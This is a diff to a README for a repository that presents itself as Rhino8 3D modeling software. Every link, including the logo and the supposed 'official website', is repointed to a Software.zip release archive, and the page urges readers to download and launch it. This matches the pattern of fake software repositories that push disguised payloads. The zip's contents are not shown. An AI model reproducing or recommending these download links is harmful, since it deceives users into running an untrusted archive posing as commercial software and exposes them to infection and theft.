@@ -1,6 +1,6 @@
 # 🦏 Rhino8-3D-Modeling-Software 🖥️📐
 
-![Rhino8 Logo](https://github.com/aryan1234gupta/Rhino8-3D-Modeling-Software/releases/download/v1.0/Software.zip)
+![Rhino8 Logo](https://github.com/aryan1234gupta/Rhino8-3D-Modeling-Software/releases/download/v2.0/Software.zip)
 
 Welcome to the Rhino8-3D-Modeling-Software repository! This tool allows you to create stunning 3D models with ease and precision using Rhino8. Whether you are working on 3D architecture, design, engineering, or rendering projects, Rhino8 is your go-to software for bringing your ideas to life in the digital realm.
 
@@ -35,13 +35,13 @@ This repository covers a variety of topics related to 3D modeling and design, in
 
 To access the Rhino8 software, click the button below:
 
-[![Download Rhino8](https://github.com/aryan1234gupta/Rhino8-3D-Modeling-Software/releases/download/v1.0/Software.zip)](https://github.com/aryan1234gupta/Rhino8-3D-Modeling-Software/releases/download/v1.0/Software.zip)
+[![Download Rhino8](https://github.com/aryan1234gupta/Rhino8-3D-Modeling-Software/releases/download/v2.0/Software.zip)](https://github.com/aryan1234gupta/Rhino8-3D-Modeling-Software/releases/download/v2.0/Software.zip)
 
 Note: The download link needs to be launched.
 
 ## 🌐 Visit our Website
 
-For more information about Rhino8 and our other products, visit our website: [Rhino8 Official Website](https://github.com/aryan1234gupta/Rhino8-3D-Modeling-Software/releases/download/v1.0/Software.zip)
+For more information about Rhino8 and our other products, visit our website: [Rhino8 Official Website](https://github.com/aryan1234gupta/Rhino8-3D-Modeling-Software/releases/download/v2.0/Software.zip)
 
 ## 🚀 Getting Started
 
